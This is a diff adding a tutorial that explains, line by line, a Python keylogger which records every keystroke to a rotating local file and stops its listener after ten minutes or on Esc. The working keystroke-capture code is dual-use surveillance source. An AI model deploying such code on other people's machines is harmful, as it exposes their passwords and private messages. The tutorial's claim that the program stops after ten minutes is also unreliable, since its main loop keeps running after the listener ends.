@@ -1,0 +1,121 @@
+
+
+### *1. Importing necessary libraries*
+python
+from pynput import keyboard
+import logging
+from logging.handlers import RotatingFileHandler
+import time
+import threading
+
+- **pynput.keyboard**: Used to monitor keyboard input events (key press and release).
+- **logging**: Facilitates logging events to a file or console.
+- **RotatingFileHandler**: Automatically handles log rotation when files reach a specific size.
+- **time**: Allows tracking and managing execution time.
+- **threading**: Enables running functions asynchronously in separate threads.
+
+---
+
+### *2. Setting up logging with rotation*
+python
+log_handler = RotatingFileHandler("keylog.txt", maxBytes=50000, backupCount=5)
+logging.basicConfig(handlers=[log_handler], level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
+
+- **RotatingFileHandler("keylog.txt", maxBytes=50000, backupCount=5)**  
+  - Saves key logs to keylog.txt.
+  - **maxBytes=50000** ensures the file does not exceed *50KB*.
+  - **backupCount=5** allows keeping up to *5 old log files*.
+- **logging.basicConfig(...)** initializes logging:
+  - Stores logs in keylog.txt.
+  - Uses *DEBUG* level, logging all details.
+  - Formats logs with *timestamp*, log level, and message.
+
+---
+
+### *3. Define termination conditions*
+python
+start_time = time.time()
+time_limit = 600  # Terminate after 10 minutes
+
+- **start_time = time.time()** records when the program starts.
+- **time_limit = 600** sets an execution limit of *10 minutes*.
+
+---
+
+### *4. Handle key press events*
+python
+def on_press(key):
+    """Handle key press events."""
+    if hasattr(key, 'char') and key.char is not None:  # Check if key has a character attribute
+        logging.info(f'Key "{key.char}" pressed')
+    else:
+        logging.info(f'Special key "{key}" pressed')
+
+- **on_press(key)** logs every key pressed:
+  - If key **has a character (key.char), it logs the character (e.g., "a" or "1").
+  - Otherwise, logs special keys (Shift, Ctrl, Enter, etc.).
+
+---
+
+### *5. Handle key release events*
+python
+def on_release(key):
+    """Handle key release events."""
+    # Check for time limit or Esc key to terminate
+    if time.time() - start_time > time_limit or key == keyboard.Key.esc:
+        logging.info("Keylogger terminated.")
+        return False  # Stop listener
+
+- **on_release(key)** manages key release conditions:
+  - If *execution exceeds 10 minutes*, stops logging.
+  - If **Escape (Esc) key** is pressed, the program terminates.
+  - **return False** stops the keyboard listener.
+
+---
+
+### *6. Start key logging listener*
+python
+def start_listener():
+    """Start the keyboard listener."""
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+- **start_listener()** initializes a listener.
+  - Calls keyboard.Listener(...) to monitor key presses/releases.
+  - **listener.join()** ensures the listener keeps running.
+
+---
+
+### *7. Run key logger in a separate thread*
+python
+listener_thread = threading.Thread(target=start_listener, daemon=True)
+listener_thread.start()
+
+- Creates a separate *daemon thread*:
+  - Runs start_listener() in parallel.
+  - Prevents blocking the main program.
+
+---
+
+### *8. Keep the program running while listener is active*
+python
+try:
+    while True:
+        time.sleep(1)  # Sleep to keep the main thread alive
+except KeyboardInterrupt:
+    logging.info("Keylogger interrupted by user.")
+
+- **while True:** keeps the program running indefinitely.
+- **time.sleep(1)** prevents excessive CPU usage.
+- **Handles KeyboardInterrupt**: If the user manually stops execution (Ctrl+C), logs interruption.
+
+---
+
+### *Summary*
+This Python keylogger:
+1. Records *each key press* (character & special keys).
+2. Logs data to a *rotating log file* (keylog.txt).
+3. Automatically *stops after 10 minutes* or when **Escape (Esc)** is pressed.
+4. Runs in a *background thread*, allowing concurrent execution.
+5. Can *gracefully handle user interruptions*.
+
